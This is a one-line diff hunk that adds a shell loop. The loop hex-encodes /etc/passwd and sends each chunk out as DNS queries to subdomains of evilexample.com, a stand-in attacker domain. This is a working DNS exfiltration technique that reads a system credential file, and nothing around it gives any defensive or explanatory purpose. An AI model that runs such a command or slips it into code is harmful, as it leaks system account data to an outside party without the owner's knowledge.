@@ -1,0 +1,1 @@
+for b in `xxd -p /etc/passwd`; do dig +short $b.evilexample.com; done
